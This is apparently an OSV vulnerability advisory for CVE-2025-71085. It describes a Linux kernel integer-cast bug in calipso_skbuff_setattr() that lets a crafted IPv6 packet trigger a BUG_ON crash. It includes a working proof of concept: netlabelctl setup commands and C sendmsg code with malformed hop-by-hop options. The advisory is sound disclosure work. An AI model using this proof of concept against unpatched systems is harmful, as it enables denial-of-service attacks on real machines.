# [H] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()

## Summary
Severity: High
Advisory: CVE-2025-71085
Ecosystem: Linux
CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
Published: 2026-01-13
Source: https://osv.dev/vulnerability/CVE-2025-71085
Type: osv

## Affected
- Linux: `Kernel` — affected >=4.8.0 <5.10.248, >=5.11.0 <5.15.198, >=5.16.0 <6.1.160, >=6.2.0 <6.6.120, >=6.7.0 <6.12.64, >=6.13.0 <6.18.4

## Details
In the Linux kernel, the following vulnerability has been resolved:

ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()

There exists a kernel oops caused by a BUG_ON(nhead < 0) at
net/core/skbuff.c:2232 in pskb_expand_head().
This bug is triggered as part of the calipso_skbuff_setattr()
routine when skb_cow() is passed headroom > INT_MAX
(i.e. (int)(skb_headroom(skb) + len_delta) < 0).

The root cause of the bug is due to an implicit integer cast in
__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
that delta = headroom - skb_headroom(skb) is never negative, otherwise
we will trigger a BUG_ON in pskb_expand_head(). However, if
headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
becomes negative, and pskb_expand_head() is passed a negative value for
nhead.

Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
by only using skb_cow() to grow headroom.

PoC:
	Using `netlabelctl` tool:

        netlabelctl map del default
        netlabelctl calipso add pass doi:7
        netlabelctl map add default address:0::1/128 protocol:calipso,7

        Then run the following PoC:

        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

        // setup msghdr
        int cmsg_size = 2;
        int cmsg_len = 0x60;
        struct msghdr msg;
        struct sockaddr_in6 dest_addr;
        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
                        sizeof(struct cmsghdr) + cmsg_len);
        msg.msg_name = &dest_addr;
        msg.msg_namelen = sizeof(dest_addr);
        msg.msg_iov = NULL;
        msg.msg_iovlen = 0;
        msg.msg_control = cmsg;
        msg.msg_controllen = cmsg_len;
        msg.msg_flags = 0;

        // setup sockaddr
        dest_addr.sin6_family = AF_INET6;
        dest_addr.sin6_port = htons(31337);
        dest_addr.sin6_flowinfo = htonl(31337);
        dest_addr.sin6_addr = in6addr_loopback;
        dest_addr.sin6_scope_id = 31337;

        // setup cmsghdr
        cmsg->cmsg_len = cmsg_len;
        cmsg->cmsg_level = IPPROTO_IPV6;
        cmsg->cmsg_type = IPV6_HOPOPTS;
        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80

        sendmsg(fd, &msg, 0);

## References
- https://cert-portal.siemens.com/productcert/html/ssa-019113.html
- https://git.kernel.org/stable/c/2bb759062efa188ea5d07242a43e5aa5464bbae1
- https://git.kernel.org/stable/c/58fc7342b529803d3c221101102fe913df7adb83
- https://git.kernel.org/stable/c/6b7522424529556c9cbc15e15e7bd4eeae310910
- https://git.kernel.org/stable/c/73744ad5696dce0e0f43872aba8de6a83d6ad570
- https://git.kernel.org/stable/c/86f365897068d09418488165a68b23cb5baa37f2
- https://git.kernel.org/stable/c/bf3709738d8a8cc6fa275773170c5c29511a0b24
- https://git.kernel.org/stable/c/c53aa6a5086f03f19564096ee084a202a8c738c0
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2025/71xxx/CVE-2025-71085.json
- https://nvd.nist.gov/vuln/detail/CVE-2025-71085
- https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
